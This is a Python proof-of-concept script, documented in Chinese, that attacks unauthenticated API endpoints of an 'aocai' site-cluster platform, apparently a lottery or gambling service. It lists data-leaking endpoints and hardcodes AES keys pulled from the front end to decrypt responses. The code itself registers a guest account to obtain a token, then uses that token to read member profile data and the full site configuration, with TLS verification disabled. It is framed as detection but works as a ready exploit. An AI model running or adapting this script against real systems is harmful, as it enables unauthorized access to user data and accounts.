#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""aocai 站群 API 网关未授权接口检测 POC。

判据（三分类）：
  1) 明文 JSON 含 "code":"success"          -> 未授权可读
  2) 纯 base64 字符串（响应加密）            -> 未授权可读（需解密）
  3) {"code":"e00006"}「长时间未操作」       -> 需登录
  另: {"code":"e00129"} 表示版本签名校验未通过（登录接口特有）

核心未授权点（按价值排序）：
  GET /aocai-api/userGuestRegister     -> 直接签发游客账号 + 有效 token + 初始余额
  GET /aocai-api/getWebConfigNew       -> 站点全量配置（加密响应，解出后含 APP 下载地址/兄弟站域名/客服地址/密钥派生代码）
  GET /aocai-api/getNoticeMessage?username=<u>  -> 按用户名读用户数据，密文长度可枚举账号存在性
  GET /aocai-api/ct/topList            -> 真实会员盈利排行（含头像 URL）
  GET /aocai-api/getBanks              -> 全量收款银行列表
  GET /aocai-api/getRegisterParams     -> 注册风控策略 + 游客初始余额
  GET /aocai-api/avatarList            -> 全站头像资源列表
  GET /aocai-api/chess/games           -> 全量游戏列表
  GET /aocai-api/plan/planLotteryList  -> 全量彩种列表
  GET /aocai-api/plan/predictionConfig -> 预测玩配置

响应解密（AES-128-ECB/Pkcs7）：
  key 来自 getWebConfigNew 解密结果的 key 字段，是段 JS 代码，需先求值再拼前缀：
    keyf  = "vxsvdax=function(){return '\x6c\x7a\x45\x32\x33\x35\x78\x56\x78\x68\x65\x24'['replace']('\x78\x68\x65\x24','');};vxsvdax()"
    eval(keyf)          = "lzE235xV"
    derivedLoginKey     = eval(keyf) + keyf[0:16] = "lzE235xVvxsvdax=function"   # AES-192-ECB，用于加密登录 username
    responseDecryptKey  = "a6bqLk97V45jXVmj"                                      # AES-128-ECB，解密所有响应

请求头契约（从前端 JS 提取）：
  token  : Cookie token 与会话头
  sign   : md5(parseQueryString(url) + '||' + token)
  tc / x-referer : 服务端登录校验所需（前端注入 __wxjs_environment 等）
"""
import base64
import json
import ssl
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 "
      "(KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1")
CTX = ssl._create_unverified_context()
KEYS = ["a6bqLk97V45jXVmj", "lzE235xVvxsvdax=function"]


def dec_any(ct_b64):
    """对纯 base64 响应做 AES-ECB 暴力解填充解密，返回 (key, plaintext)。"""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    try:
        raw = base64.b64decode(ct_b64)
    except Exception:
        return None, None
    for k in KEYS:
        kb = k.encode()[:32]
        if len(kb) not in (16, 24, 32):
            kb = kb.ljust(16, b"\0")[:16]
        try:
            c = Cipher(algorithms.AES(kb), modes.ECB()).decryptor()
            pt = c.update(raw) + c.finalize()
            pad = pt[-1]
            body = pt[:-pad] if 1 <= pad <= 16 and pt.endswith(bytes([pad]) * pad) else pt
            t = body.decode("utf-8", "ignore")
            pr = sum(1 for ch in t if ch.isprintable() or ch in "\r\n\t")
            if t and pr / len(t) > 0.9:
                return k, t
        except Exception:
            continue
    return None, None


def check(base, path, token=None, params=None):
    base = base.rstrip("/")
    url = base + "/aocai-api/" + path
    hd = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
          "Origin": base, "Referer": base + "/wap/",
          "X-Requested-With": "XMLHttpRequest"}
    if token:
        hd["token"] = token
        hd["Cookie"] = "token=" + token
    if params:
        url += "?" + urllib.parse.urlencode(params)
    r = urllib.request.Request(url, headers=hd)
    with urllib.request.urlopen(r, timeout=25, context=CTX) as resp:
        b = resp.read()
    t = b.decode("utf-8", "ignore").strip()
    if t.startswith('"'):
        k, p = dec_any(t.strip('"'))
        return ("unauth-decrypted", k, p) if p else ("unauth-cipher", None, len(t))
    if '"e00006"' in t:
        return ("needs-login", None, t[:200])
    if '"e00129"' in t:
        return ("version-block", None, t[:200])
    return ("unauth-plain", None, t[:600])


if __name__ == "__main__":
    import sys
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    B = sys.argv[1] if len(sys.argv) > 1 else "https://target/aocai-api-base-host"
    # 步骤 1：拿游客 token
    st, k, d = check(B, "userGuestRegister")
    print("userGuestRegister ->", st, d)
    tk = None
    if isinstance(d, str) and '"token"' in d:
        tk = json.loads(d)["data"]["token"]
    # 步骤 2：用 token 读会员资料
    print("getUserInfo ->", check(B, "getUserInfo", token=tk))
    print("getWebConfigNew ->", check(B, "getWebConfigNew"))
